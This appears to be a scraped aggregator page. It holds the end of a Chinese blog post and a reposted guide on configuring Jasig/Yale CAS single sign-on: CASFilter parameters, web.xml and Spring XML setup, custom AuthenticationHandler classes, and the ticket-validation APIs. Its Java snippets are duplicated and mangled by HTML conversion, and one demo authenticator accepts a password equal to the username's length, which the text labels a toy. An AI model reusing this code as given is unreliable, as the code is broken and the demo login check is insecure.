<p>2：PGT是ST签发的。用户凭借ST去访问Proxy service，Proxy service去CAS验证ST（同时传递PgtUrl参数给CAS），如果ST验证成功，则CAS用ST签发一个PGT，PGT对象里的ticketGrantingTicket是签发ST的TGT对象。</p>
<p>3：PT是PGT签发的。Proxy service代理back-end service去CAS获取PT的时候，CAS根据传来的pgt参数，获取到PGT对象，然后调用其grantServiceTicket方法，生成一个PT对象。</p>
<p> <img src="" alt=""></p>
<p>TGT、ST、PGT、PT之间的关联关系</p>
<h1 id="cas-client-">CAS CLIENT篇</h1>
<h2 id="casfilter-">CASFilter 参数说明：</h2>
<p>参数</p>
<p>是否必须</p>
<p>说明 com.olymtech.cas.client.filter.loginUrl</p>
<p>是</p>
<p>指定 CAS 提供登录页面的 URL com.olymtech.cas.client.filter.validateUrl</p>
<p>是</p>
<p>指定 CAS 提供 service ticket 或 proxy ticket 验证服务的 URL com.olymtech.cas.client.filter.serverName</p>
<p>是</p>
<p>指定客户端的域名和端口，是指客户端应用所在机器而不是 CAS Server 所在机器，该参数或 serviceUrl 至少有一个必须指定 com.olymtech.cas.client.filter.serviceUrl</p>
<p>否</p>
<p>该参数指定过后将覆盖 serverName 参数，成为登录成功过后重定向的目的地址 com.olymtech.cas.client.filter.wrapRequest</p>
<p>否</p>
<p>如果指定为 true，那么 CASFilter 将重新包装 HttpRequest,并且使 getRemoteUser() 方法返回当前登录用户的用户名 com.olymtech.cas.client.filter.noFilter</p>
<p>否</p>
<p>设置不过滤的路径，语法如下：/name1/,/name2, com.olymtech.cas.client.filter.proxyCallbackUrl</p>
<p>否</p>
<p>用于当前应用需要作为其他服务的代理(proxy)时获取 Proxy Granting Ticket 的地址 com.olymtech.cas.client.filter.authorizedProxy</p>
<p>否</p>
<p>用于允许当前应用从代理处获取 proxy tickets，该参数接受以空格分隔开的多个 proxy URLs，但实际使用只需要一个成功即可。当指定该参数过后，需要修改 validateUrl 到 proxyValidate，而不再是 serviceValidate com.olymtech.cas.client.filter.renew</p>
<p>否</p>
<p>如果指定为 true，那么受保护的资源每次被访问时均要求用户重新进行验证，而不管之前是否已经通过 com.olymtech.cas.client.filter.gateway</p>
<p>否</p>
<p>指定 gateway 属性</p>
<h1 id="-">应用整合篇</h1>
<h2 id="-java-">一、JAVA程序整合</h2>
<p><strong>1、**</strong>应用配置说明（结合cas client<strong>**）</strong></p>
<p>导入key到本地jdk（tomcat使用的jdk必须）</p>
<p>keytool -import -keystore d:/work/jdk1.6.0_13/jre/lib/security/cacerts -file d:/casex/800jit.crt -alias 800jit</p>
<p>在ie中导入证书800jit.crt</p>
<p>修改web程序的web.xml添加</p>
<pre><code>&lt;!-- 用于单点退出 --&gt;

&lt;listener&gt;

    &lt;listener-class&gt;org.jasig.cas.client.session.SingleSignOutHttpSessionListener&lt;/listener-class&gt;

&lt;/listener&gt;



&lt;filter&gt;

&lt;filter-name&gt;CAS Single Sign Out Filter&lt;/filter-name&gt;

&lt;filter-class&gt;org.jasig.cas.client.session.SingleSignOutFilter&lt;/filter-class&gt;

&lt;/filter&gt;



&lt;!-- 用于单点登录 --&gt;



&lt;filter&gt;

   &lt;filter-name&gt;CAS Filter&lt;/filter-name&gt;

   &lt;filter-class&gt;com.olymtech.cas.client.filter.CASFilter&lt;/filter-class&gt;

   &lt;init-param&gt;

       &lt;param-name&gt;com.olymtech.cas.client.filter.loginUrl&lt;/param-name&gt;

       &lt;param-value&gt;https://cas.server.com/cas/login&lt;/param-value&gt;

   &lt;/init-param&gt;

   &lt;init-param&gt;

       &lt;param-name&gt;com.olymtech.cas.client.filter.validateUrl&lt;/param-name&gt;

       &lt;param-value&gt;https://cas.server.com/cas/serviceValidate&lt;/param-value&gt;

   &lt;/init-param&gt;

   &lt;init-param&gt;

       &lt;param-name&gt;com.olymtech.cas.client.filter.serverName&lt;/param-name&gt;

       &lt;param-value&gt;saas.server.com&lt;/param-value&gt;

   &lt;/init-param&gt;

   &lt;init-param&gt;

       &lt;param-name&gt;com.olymtech.cas.client.filter.wrapRequest&lt;/param-name&gt;

       &lt;param-value&gt;true&lt;/param-value&gt;

   &lt;/init-param&gt;

&lt;/filter&gt;



&lt;filter-mapping&gt;

   &lt;filter-name&gt;CAS Single Sign Out Filter&lt;/filter-name&gt;

   &lt;url-pattern&gt;//*&lt;/url-pattern&gt;

&lt;/filter-mapping&gt;



&lt;filter-mapping&gt;

   &lt;filter-name&gt;CAS Filter&lt;/filter-name&gt;

   &lt;url-pattern&gt;//*&lt;/url-pattern&gt;

&lt;/filter-mapping&gt;
</code></pre><p>在jsp/servlet中得到登陆数据：</p>
<p>&lt;%@ page language=&quot;java&quot; import=&quot;com.olymtech.cas.client.filter.CASFilterRequestWrapper&quot;%&gt;</p>
<p>&lt;%</p>
<p>CASFilterRequestWrapper  reqWrapper=<strong>new</strong> CASFilterRequestWrapper(request);</p>
<p>String username = reqWrapper.getRemoteUser();</p>
<p>%&gt;</p>
<h2 id="-net-">二、.NET程序整合</h2>
<h1 id="-">附件</h1>
<p>ssl.rar（证书）</p>
<p>http.conf（apache配置文件）</p>
<p>httpd-ssl.conf（apache配置文件）</p>
<p>httpd-vhosts.conf（apache配置文件）</p>
<p>server.xml（tomcat配置文件）</p>
<p>AppSsoDemo-java.rar（java整合例子，包含所需jar包）</p>
<p>posted on 2010-08-05 17:23 <a href="http://www.cnblogs.com/hellowood/" target="_blank">horus</a> 阅读(2394) 评论(2) <a href="http://www.cnblogs.com/hellowood/admin/EditPosts.aspx?postid=1793364" target="_blank">编辑</a> <a href="http://www.cnblogs.com/hellowood/archive/2010/08/05/1793364.html#" target="_blank">收藏</a>
<img src="" alt=""></p>
<p><a href="">刷新评论</a><a href="http://www.cnblogs.com/hellowood/archive/2010/08/05/1793364.html#" target="_blank">刷新页面</a><a href="http://www.cnblogs.com/hellowood/archive/2010/08/05/1793364.html#top" target="_blank">返回顶部</a></p>
<p><a href="http://q.cnblogs.com/" target="_blank">程序员问答社区，解决您的技术难题</a>
<a href="http://www.cnblogs.com/" title="程序员的网上家园" target="_blank">博客园首页</a><a href="http://q.cnblogs.com/" title="程序员问答社区" target="_blank">博问</a><a href="http://news.cnblogs.com/" title="IT新闻" target="_blank">新闻</a><a href="http://home.cnblogs.com/ing/" target="_blank">闪存</a><a href="http://job.cnblogs.com/" target="_blank">程序员招聘</a><a href="http://kb.cnblogs.com/" target="_blank">知识库</a>
Powered by: <a href="http://www.cnblogs.com/" target="_blank">博客园</a> 模板提供：<a href="http://blog.hjenglish.com/" target="_blank">沪江博客</a> Copyright ©2012 horus</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/CAS/">CAS</a></li></span></span> | <span class="tags">Tagged <a href="/tags/CAS/" class="label label-primary">CAS</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-CAS--cas改造随笔-horus-博客园/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-CAS--cas改造随笔-horus-博客园" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-CAS--casclient使用指南-老老-ITeye技术网站/">cas client使用指南 </a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-CAS--casclient使用指南-老老-ITeye技术网站/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="cas-client-iteye-">cas client使用指南 - 老老 - ITeye技术网站</h1>
<p><a href="http://www.iteye.com/" target="_blank">首页</a> <a href="http://www.iteye.com/news" target="_blank">资讯</a> <a href="http://www.iteye.com/magazines" target="_blank">精华</a> <a href="http://www.iteye.com/forums" target="_blank">论坛</a> <a href="http://www.iteye.com/ask" target="_blank">问答</a> <a href="http://www.iteye.com/blogs" target="_blank">博客</a> <a href="http://www.iteye.com/blogs/subjects" target="_blank">专栏</a> <a href="http://www.iteye.com/groups" target="_blank">群组</a> <a href="http://lvyanglin.iteye.com/blog/618081#" target="_blank">更多 ▼</a></p>
<p><a href="http://www.iteye.com/job" target="_blank">招聘</a> <a href="http://www.iteye.com/search" target="_blank">搜索</a></p>
<p><a href="http://lvyanglin.iteye.com/login" title="登录" target="_blank">您还未登录 !</a> <a href="http://lvyanglin.iteye.com/login" target="_blank">登录</a> <a href="http://lvyanglin.iteye.com/signup" target="_blank">注册</a></p>
<h1 id="-http-lvyanglin-iteye-com-"><a href="http://lvyanglin.iteye.com/" target="_blank">老老</a></h1>
<ul>
<li><a href="http://lvyanglin.iteye.com/" target="_blank"><strong>博客</strong></a></li>
<li><a href="http://lvyanglin.iteye.com/weibo" target="_blank">微博</a></li>
<li><a href="http://lvyanglin.iteye.com/album" target="_blank">相册</a></li>
<li><a href="http://lvyanglin.iteye.com/link" target="_blank">收藏</a></li>
<li><a href="http://lvyanglin.iteye.com/blog/guest_book" target="_blank">留言</a></li>
<li><a href="http://lvyanglin.iteye.com/blog/profile" target="_blank">关于我</a></li>
</ul>
<h3 id="-cas-client-"><a href="">cas client使用指南</a> **</h3>
<p><strong>博客分类：</strong></p>
<ul>
<li><a href="http://lvyanglin.iteye.com/category/67638" target="_blank">java</a>
<a href="http://www.iteye.com/blogs/tag/%E4%BC%81%E4%B8%9A%E5%BA%94%E7%94%A8" target="_blank">企业应用</a><a href="http://www.iteye.com/blogs/tag/SSO" target="_blank">SSO</a><a href="http://www.iteye.com/blogs/tag/SQL%20Server" target="_blank">SQL Server</a><a href="http://www.iteye.com/blogs/tag/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank">应用服务器</a><a href="http://www.iteye.com/blogs/tag/Spring" target="_blank">Spring</a> </li>
</ul>
<p>2008-02-27
JA-SIG（CAS）学习笔记3
关键字: cas sso 统一身份认证 java ja-sig
技术背景知识：
  JA-SIG CAS服务环境搭建，请参考 ：JA-SIG（CAS）学习笔记1 
  JA-SIG CAS业务架构介绍，请参考 ：JA-SIG（CAS）学习笔记2
  HTTPS所涉及的Java安全证书知识，请参考 ：Java  keytool 安全证书学习笔记
CAS技术框架
  CAS  Server
    目前，我们使用的CAS Server 3.1.1的是基于Spring Framework编写的，因此在CAS服务器端的配置管理中，绝大多数是Spring式的Java Bean XML配置。CAS 的服务器提供了一套易于定制的用户认证器接口，用户可以根据自身企业的在线系统的认证方式，来定制自己的认证逻辑。不论是传统的用户名/密码方式，还是基于安全证书的方式；是基于关系数据库的存储，还是采用LDAP服务器，CAS  Server给我们提供了这些常用的验证器模板代码，只要稍作修改，便可灵活使用了。
    对于广大的中国企业用户而言，另一个需要定制的功能莫过于全中文、企业特色的用户身份认证页面了。CAS Server提供了两套系统界面，一套是默认的CAS英文标准页面，另一套则是专门提供给用户来定制修改的。（PS：老外们做事情就是人性化啊~~）那么对CAS Server端的后续学习，我们将围绕着身份认证模块定制和界面定制这两方面展开。
  CAS  Client
    客户端我们使用的是CAS Client 2.1.1。虽然在官方网站上已出现了3.1.0版本的下载，但该版本地代码已经完全重写，使用的package和类名同2.1.1大相径庭了，最关键的是，该版本暂时没有对应的API说明文档。虽然咖啡我对程序版本怀有极大的“喜新厌旧”的心态，但安全起见，还是先2.1.1吧，相信3.1.0的文档耶鲁大学的大牛们已经在整理了，期待中……
CAS Client2.1.1.jar中的代码是相当精炼的，有兴趣的朋友建议阅读一下源码。Jar包中的代码分成三个大部分</p>
<ol>
<li>edu.yale.its.tp.cas.util 包，其中只有一个工具类 SecureURL.java 用来访问HTTPS URL</li>
<li>edu.yale.its.tp.cas.proxy包，用来处理Proxy Authentication代理认证的3个类，其中ProxyTicketReceptor.java是 接收PGT回调的servlet，在下文中我们会提及。</li>
<li>edu.yale.its.tp.cas.client包，其中包含了CAS Filter ，Tag Library等主要的认证客户端工具类，我们在后面会进行重点介绍。
针对CAS Client的学习，我们的重点将放在CAS Filter 和ProxyTicketReceptor 的配置以及在Java SE环境下，直接使用 ServiceTicketValidator进行Ticket认证实现上。
CAS服务器端应用
定制适合你的身份认证程序
通过前面的学习，我们了解了CAS具有一个良好而强大的SSO功能框架。接下来，我们要学习如何将实际企业应用中的身份认证同CAS进行整合。
简单的说，要将现有企业应用中的认证集成到CAS Server中，只要实现一个名为AuthenticationHandler的一个认证处理Java接口就行。以下是该接口的源代码：
Java代码
public interface AuthenticationHandler {<br>//<em>/</em> 
/<em> 该方法决定一个受支持的credentials是否是可用的， 
/</em> 如果可用，该方法返回true，则说明身份认证通过 
/<em>/ 
boolean  authenticate(Credentials credentials)  throws  AuthenticationException;<br>//</em>/<em> 
/</em> 该方法决定一个credentials是否是当前的handle所支持的 
/<em>/ 
boolean  supports(Credentials credentials);<br>} 
public interface AuthenticationHandler {
//</em>/<em>
/</em> 该方法决定一个受支持的credentials是否是可用的，
/<em> 如果可用，该方法返回true，则说明身份认证通过
/</em>/
boolean  authenticate(Credentials credentials)  throws  AuthenticationException;
//<em>/</em>
/<em> 该方法决定一个credentials是否是当前的handle所支持的
/</em>/
boolean  supports(Credentials credentials);
}
这里我们要说明一下Credentials这个CAS的概念。所谓Credentials是由外界提供给CAS来证明自身身份的信息，简单的如一个用户名/密码对就是一个Credentials，或者一个经过某种加密算法生成的密文证书也可以是一个Credentials。在程序的实现上，Credentials被声明为一个可序列化的接口，仅仅起着标识作用，源代码如下：
Java代码
public interface Credentials extends Serializable {<br>// marker interface contains no methods<br>} 
public interface Credentials extends Serializable {
// marker interface contains no methods
}
CAS的API中，已经为我们提供了一个最常用的实现UsernamePasswordCredentials  用户名/密码凭证，代码如下：
Java代码
public class UsernamePasswordCredentials implements Credentials {<br>//<em>/</em> Unique ID for serialization. /<em>/ 
private static final long serialVersionUID = -8343864967200862794L;<br>//</em>/<em> The username. /</em>/ 
private String username;<br>//<em>/</em> The password. /*/ 
private String password;<br>public final String getPassword() {<br>   return this.password;<br>}<br>public final void setPassword(final String password) {<br>   this.password = password;<br>}<br>public final String getUsername() {<br>   return this.username;<br>}<br>public final void setUsername(final String userName) {<br>   this.username = userName;<br>}<br>public String toString() {<br>   return this.username;<br>}<br>public boolean equals(final Object obj) {<br>   if (obj == null || !obj.getClass().equals(this.getClass())) {  <pre><code>   return false;  
</code></pre>   }<br>   final UsernamePasswordCredentials c = (UsernamePasswordCredentials) obj;<br>   return this.username.equals(c.getUsername())  <pre><code>   &amp;&amp; this.password.equals(c.getPassword());  
</code></pre>}<br>public int hashCode() {<br>   return this.username.hashCode() ^ this.password.hashCode();<br>}<br>} 
public class UsernamePasswordCredentials implements Credentials {
//<em>/</em> Unique ID for serialization. /<em>/
private static final long serialVersionUID = -8343864967200862794L;
//</em>/<em> The username. /</em>/
private String username;
//<em>/</em> The password. /*/
private String password;
public final String getPassword() {
   return this.password;
}
public final void setPassword(final String password) {
   this.password = password;
}
public final String getUsername() {
   return this.username;
}
public final void setUsername(final String userName) {
   this.username = userName;
}
public String toString() {
   return this.username;
}
public boolean equals(final Object obj) {
   if (obj == null || !obj.getClass().equals(this.getClass())) {<pre><code>   return false;
</code></pre>   }
   final UsernamePasswordCredentials c = (UsernamePasswordCredentials) obj;
   return this.username.equals(c.getUsername())<pre><code>   &amp;&amp; this.password.equals(c.getPassword());
</code></pre>}
public int hashCode() {
   return this.username.hashCode() ^ this.password.hashCode();
}
}
很简单不是吗？就是存储一个用户名和密码的java bean而已。
 接下来，我们将一个Credentials传给一个AuthenticationHandler进行认证，首先调用boolean  supports(Credentials credentials)方法察看当前传入的Credentials实例，AuthenticationHandler实例现是否支持它？如果支持，再调用boolean  authenticate(Credentials credentials)方法进行认证。由于用户名/密码方式是最常用的认证方法，因此CAS为我们提供了一个现成的基于该方式的抽象认证处理类AbstractUsernamePasswordAuthenticationHandler。通常我们只需要继承该类，并实现其中的    authenticateUsernamePasswordInternal方法即可。下面我们给出一个Demo的实现类，它的校验逻辑很简单——仅校验用户名的字符长度是否与密码的相等（这里密码是一个表示长度的整数），如果相等则认为认证通过，请看代码：
Java代码
public class UsernameLengthAuthnHandler  <pre><code>              extends AbstractUsernamePasswordAuthenticationHandler {  
</code></pre>protected boolean authenticateUsernamePasswordInternal( UsernamePasswordCredentials credentials)  throws AuthenticationException {<br>//<em><br>/</em> 这里我们完全可以用自己的认证逻辑代替，比如将用户名/密码传入一个SQL语句<br>/<em> 向数据库验证是否有对应的用户账号，这不是我们最经常干的事么？<br>/</em> 只需要将下面的程序替换掉就OK了！！So  easy，so  simple！<br>/<br>String username = credentials.getUsername();<br>String password = credentials.getPassword();<br>String correctPassword = Integer.toString(username.length());<br>return correctPassword.equals(password);<br>}<br>} 
public class UsernameLengthAuthnHandler<pre><code>              extends AbstractUsernamePasswordAuthenticationHandler {
</code></pre>protected boolean authenticateUsernamePasswordInternal( UsernamePasswordCredentials credentials)  throws AuthenticationException {
//<em>
/</em> 这里我们完全可以用自己的认证逻辑代替，比如将用户名/密码传入一个SQL语句
/<em> 向数据库验证是否有对应的用户账号，这不是我们最经常干的事么？
/</em> 只需要将下面的程序替换掉就OK了！！So  easy，so  simple！
/
String username = credentials.getUsername();
String password = credentials.getPassword();
String correctPassword = Integer.toString(username.length());
return correctPassword.equals(password);
}
}
介绍到这里，大家应该清楚如何定制自己的AuthenticationHandler类了吧！这里要附带说明的是，在CAS Server的扩展API中已经提供了大量常用认证形式的实现类，它们同CAS Server的war包一同分发：
cas-server-support-generic-3.1.1.jar ——使用Map记录用户认证信息的实现
cas-server-support-jdbc-3.1.1.jar —— 基于Spring JDBC的数据库实现（我们常用的）
cas-server-support-ldap-3.1.1.jar —— 基于LDAP的用户认证实现
更多其他形式的实现各位看官有兴趣的，可以一一阅读源码。
配置你的身份认证程序
完成了定制认证类的代码编写，接下来就是要让CAS Server来调用它了。在CAS的框架中，对程序的配置都是使用Spring Framework的xml文件，这对于熟悉Spring的程序员而言算驾轻就熟了。
配置文件位于应用部署目录的WEB-INF子目录下——deployerConfigContext.xml。在bean id=authenticationManager 的 authenticationHandlers属性中配置我们的AuthenticationHandlers：
引用
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
<beans xmlns="http://www.springframework.org/schema/beans"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:p="http://www.springframework.org/schema/p"
  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd">
<bean id="authenticationManager"
class="org.jasig.cas.authentication.AuthenticationManagerImpl">
   。。。
   。。。
<property name="authenticationHandlers">
<list>
<bean class="org.jasig.cas.authentication.handler.support.HttpBasedServiceCredentialsAuthenticationHandler" p:httpClient-ref="httpClient" />
   &lt;!—下面就是系统默认的验证器配置，你可以替换它，或者增加一个新的handler --&gt;
<bean     class="org.jasig.cas.authentication.handler.support.SimpleTestUsernamePasswordAuthenticationHandler" />
</list>
</property>
</bean>
。。。
。。。
</beans>
我们发现authenticationHandlers属性是一个list，在这个list中可以配置多个AuthenticationHandlers。这些AuthenticationHandlers形成了一个验证器链，所有提交给CAS的Credentials信息将通过这个验证器链的链式过滤，只要这链中有一个验证器通过了对Credentials的验证，就认为这个Credentials是合法的。这样的设计使得我们可以很轻松的整合不同验证体系的已有应用到同一个CAS上，比如：A验证器负责校验alpha系统提交的Credentials，它是基于LDAP服务器的；B验证器负责校验beta系统提交的Credentials，它是一个传统的RDB用户表认证；C验证器负责校验gamma系统提交的基于RSA证书加密的Credentials。3种完全不同的用户身份认证通过配置就可以统一在同一个CAS服务内，很好很强大，不是吗！！
定制身份验证登录界面
 CAS Server在显示界面层view使用了“主题Theme”的概念。在{project.home}/webapp/WEB-INF/view/jsp/目录下，系统默认提供了两套得UI —— default和simple 。default方案使用了CSS等相对复杂得界面元素，而simple方案提供了最简化的界面表示方式。在整个的CAS Server服务器端，有四个界面是我们必须要实现的：
casConfirmView.jsp —— 确认信息（警告信息）页面
casGenericSuccess.jsp —— 登陆成功提示页面
casLoginView.jsp —— 登录输入页面
casLogoutView.jsp —— SSO登出提示页面
这些都是标准的jsp页面，如何实现他们，完全由您说了算，除了名字不能改。
CAS为view的展示提供了3个级别的定制方式，让我们从最直观简单的开始吧。
1． 采用文件覆盖方式：直接修改default中的页面或者将新写好的四个jsp文件覆盖到default目录中。这种方式最直观和简单，但咖啡建议各位在使用这种方式前将原有目录中的文件备份一下，以备不时之需。
2． 修改UI配置文件，定位UI目录：在CAS Server端/webapp/WEB-INF/classes/ 目录下，有一个名为default_views.properties的属性配置文件，你可以通过修改配置文件中的各个页面文件位置，指向你新UI文件，来达到修改页面展示的目的。
3． 修改配置文件的配置文件，这话看起来有点别扭，其实一点不难理解。在方法2中的default_views.properties文件是一整套的UI页面配置。如果我想保存多套的UI页面配置就可以写多个的properties文件来保存这些配置。在CAS Server端/webapp/WEB-INF/目录下有cas-servlet.xml和cas.properties两个文件，cas-servlet.xml使用了cas.properties文件中的cas.viewResolver.basename属性来定义view属性文件的名字，因此你可以选者直接修改cas-servlet.xml中的viewResolver 下的basenames属性，或者修改cas.properties中的cas.viewResolver.basename属性，指定新的properties文件名，这样可以轻松的替换全套UI。
CAS客户端配置及API应用
CASFilter的配置
对于大部分web应用而言，使用CAS集成统一认证是相对简单的事，只要为需要认证的URL配置edu.yale.its.tp.cas.client.filter.CASFilter认证过滤器。下面我们就针对过滤器的配置进行说明。首先参看一下Filter的基本配置：
引用
<web-app>
...
<filter>
<filter-name>CAS Filter</filter-name>
<filter-class>edu.yale.its.tp.cas.client.filter.CASFilter</filter-class>
<init-param>
  <param-name>edu.yale.its.tp.cas.client.filter.loginUrl</param-name>
  <param-value><a href="https://secure.its.yale.edu/cas/login" target="_blank">https://secure.its.yale.edu/cas/login</a>&lt;;/param-value&gt;
</init-param>
<init-param>
  <param-name>edu.yale.its.tp.cas.client.filter.validateUrl</param-name>
  <param-value><a href="https://secure.its.yale.edu/cas/serviceValidate" target="_blank">https://secure.its.yale.edu/cas/serviceValidate</a>&lt;;/param-value&gt;
</init-param>
<init-param>
  <param-name>edu.yale.its.tp.cas.client.filter.serverName</param-name>
  <param-value>your server name and port (e.g., www.yale.edu:8080)</param-value>
</init-param>
</filter>
<filter-mapping>
<filter-name>CAS Filter</filter-name>
<url-pattern>/requires-cas-authetication//<em></url-pattern>
</filter-mapping>
...
</web-app>
上述配置中的init-param是filter的3个必备的属性，下面这张表则是filter全部属性的详细说明：
ProxyTicketReceptor的配置
大家还记得在前面我们说过的Proxy Authentication中的call back URL吗？ProxyTicketReceptor是部署在client端的一个servlet，提供server端回传PGT和PGTIOU的。它的xml部署如下：
引用
<web-app>
...
<servlet>
<servlet-name>ProxyTicketReceptor</servlet-name>
<servlet-class>edu.yale.its.tp.cas.proxy.ProxyTicketReceptor</servlet-class>
<init-param>
  <param-name>edu.yale.its.tp.cas.proxyUrl</param-name>
  <param-value><a href="https://secure.its.yale.edu/cas/proxy" target="_blank">https://secure.its.yale.edu/cas/proxy</a>&lt;;/param-value&gt;
</init-param>
</servlet>
<servlet-mapping>
<servlet-name>ProxyTicketReceptor</servlet-name>
<url-pattern>/CasProxyServlet</url-pattern>
</servlet-mapping>
...
</webapp>
这里要说明的是它的参数edu.yale.its.tp.cas.proxyUrl。在服务端通过ProxyTicketReceptor将PGT和PGTIOU传给客户端后，ProxyTicketReceptor在进行Proxy Authentication的过程中需要向服务端请求一个ProxyTicket（PT），这个proxyUrl就是服务端的请求入口了。（关于Proxy Authentication的运作原理，参见JA-SIG（CAS）学习笔记2 ）
CAS Client端的API应用1．用户可以通过以下两种方式的任意一种，从JSP或servlet中获取通过认证的用户名：
引用
String username = (String)session.getAttribute(CASFilter.CAS_FILTER_USER);
或者
String username = (String)session.getAttribute(&quot;edu.yale.its.tp.cas.client.filter.user&quot;);
2．获得更完整的受认证用户信息对象CASReceipt Java Bean，可以使用以下语句的任一:
引用
CASReceipt  receipt = (CASReceipt )session.getAttribute(CASFilter.CAS_FILTER_RECEIPT);
或者
CASReceipt  receipt = (CASReceipt )session.getAttribute(&quot;edu.yale.its.tp.cas.client.filter.receipt&quot;);
3．手工编码使用CAS Java Object进行用户验证，使用ServiceTicketValidator或者 ProxyTicketValidator（代理认证模式下），在servlet中对用户身份进行验证。
3-1．ServiceTicketValidator
Java代码
import edu.yale.its.tp.cas.client./</em>;<br>...<br>String user = null;<br>String errorCode = null;<br>String errorMessage = null;<br>String xmlResponse = null;  </li>
</ol>
<p>//<em> instantiate a new ServiceTicketValidator /</em>/ 
ServiceTicketValidator sv = new ServiceTicketValidator();  </p>
<p>//<em> set its parameters /</em>/ 
sv.setCasValidateUrl(&quot;<a href="https://secure.its.yale.edu/cas/serviceValidate" target="_blank">https://secure.its.yale.edu/cas/serviceValidate</a>&quot;);<br>sv.setService(urlOfThisService);<br>sv.setServiceTicket(request.getParameter(&quot;ticket&quot;));   </p>
<p>String urlOfProxyCallbackServlet = &quot;<a href="https://portal.yale.edu/CasProxyServlet" target="_blank">https://portal.yale.edu/CasProxyServlet</a>&quot;;<br>sv.setProxyCallbackUrl(urlOfProxyCallbackServlet);  </p>
<p>//<em> contact CAS and validate /</em>/ 
sv.validate();  </p>
<p>//<em> if we want to look at the raw response, we can use getResponse() /</em>/ 
xmlResponse = sv.getResponse();  </p>
<p>if(sv.isAuthenticationSuccesful()) {<br>  user = sv.getUser();<br>} else {<br>  errorCode = sv.getErrorCode();<br>  errorMessage = sv.getErrorMessage();<br>}<br>  //<em> The user is now authenticated. /</em>/ 
  //<em> If we did set the proxy callback url, we can get proxy tickets with: /</em>/ 
  String urlOfTargetService = &quot;<a href="http://hkg2.its.yale.edu/someApp/portalFeed" target="_blank">http://hkg2.its.yale.edu/someApp/portalFeed</a>&quot;;<br>  String proxyTicket = ProxyTicketReceptor.getProxyTicket( sv.getPgtIou() , urlOfTargetService); 
import edu.yale.its.tp.cas.client./<em>;
...
String user = null;
String errorCode = null;
String errorMessage = null;
String xmlResponse = null;
//</em> instantiate a new ServiceTicketValidator /<em>/
ServiceTicketValidator sv = new ServiceTicketValidator();
//</em> set its parameters /<em>/
sv.setCasValidateUrl(&quot;<a href="https://secure.its.yale.edu/cas/serviceValidate" target="_blank">https://secure.its.yale.edu/cas/serviceValidate</a>&quot;);
sv.setService(urlOfThisService);
sv.setServiceTicket(request.getParameter(&quot;ticket&quot;));
String urlOfProxyCallbackServlet = &quot;<a href="https://portal.yale.edu/CasProxyServlet" target="_blank">https://portal.yale.edu/CasProxyServlet</a>&quot;;
sv.setProxyCallbackUrl(urlOfProxyCallbackServlet);
//</em> contact CAS and validate /<em>/
sv.validate();
//</em> if we want to look at the raw response, we can use getResponse() /<em>/
xmlResponse = sv.getResponse();
if(sv.isAuthenticationSuccesful()) {
  user = sv.getUser();
} else {
  errorCode = sv.getErrorCode();
  errorMessage = sv.getErrorMessage();
}
  //</em> The user is now authenticated. /<em>/
  //</em> If we did set the proxy callback url, we can get proxy tickets with: /<em>/
  String urlOfTargetService = &quot;<a href="http://hkg2.its.yale.edu/someApp/portalFeed" target="_blank">http://hkg2.its.yale.edu/someApp/portalFeed</a>&quot;;
  String proxyTicket = ProxyTicketReceptor.getProxyTicket( sv.getPgtIou() , urlOfTargetService);
3-2．ProxyTicketValidator
Java代码
import edu.yale.its.tp.cas.client./</em>;<br>...<br>String user = null;<br>String errorCode = null;<br>String errorMessage = null;<br>String xmlResponse = null;<br>List proxyList = null;  </p>
<p>//<em> instantiate a new ProxyTicketValidator /</em>/ 
ProxyTicketValidator pv = new ProxyTicketValidator();   </p>
<p>//<em> set its parameters /</em>/ 
pv.setCasValidateUrl(&quot;<a href="https://secure.its.yale.edu/cas/proxyValidate" target="_blank">https://secure.its.yale.edu/cas/proxyValidate</a>&quot;);<br>pv.setService(urlOfThisService);<br>pv.setServiceTicket(request.getParameter(&quot;ticket&quot;));   </p>
<p>String urlOfProxyCallbackServlet = &quot;<a href="https://portal.yale.edu/CasProxyServlet" target="_blank">https://portal.yale.edu/CasProxyServlet</a>&quot;;<br>pv.setProxyCallbackUrl(urlOfProxyCallbackServlet);   </p>
<p>//<em> contact CAS and validate /</em>/ 
pv.validate();  </p>
<p>//<em> if we want to look at the raw response, we can use getResponse() /</em>/ 
xmlResponse = pv.getResponse();   </p>
<p>//<em> read the response /</em>/ 
if(pv.isAuthenticationSuccesful()) {<br>  user = pv.getUser();<br>  proxyList = pv.getProxyList();<br>} else {<br>  errorCode = pv.getErrorCode();<br>  errorMessage = pv.getErrorMessage();<br>  //<em> handle the error /</em>/ 
}<br>//<em> The user is now authenticated. /</em>/<br>//<em> If we did set the proxy callback url, we can get proxy tickets with this method call: /</em>/<br>String urlOfTargetService = &quot;<a href="http://hkg2.its.yale.edu/someApp/portalFeed" target="_blank">http://hkg2.its.yale.edu/someApp/portalFeed</a>&quot;;<br>String proxyTicket = ProxyTicketReceptor.getProxyTicket( pv.getPgtIou() , urlOfTargetService); 
import edu.yale.its.tp.cas.client./<em>;
...
String user = null;
String errorCode = null;
String errorMessage = null;
String xmlResponse = null;
List proxyList = null;
//</em> instantiate a new ProxyTicketValidator /<em>/
ProxyTicketValidator pv = new ProxyTicketValidator();
//</em> set its parameters /<em>/
pv.setCasValidateUrl(&quot;<a href="https://secure.its.yale.edu/cas/proxyValidate" target="_blank">https://secure.its.yale.edu/cas/proxyValidate</a>&quot;);
pv.setService(urlOfThisService);
pv.setServiceTicket(request.getParameter(&quot;ticket&quot;));
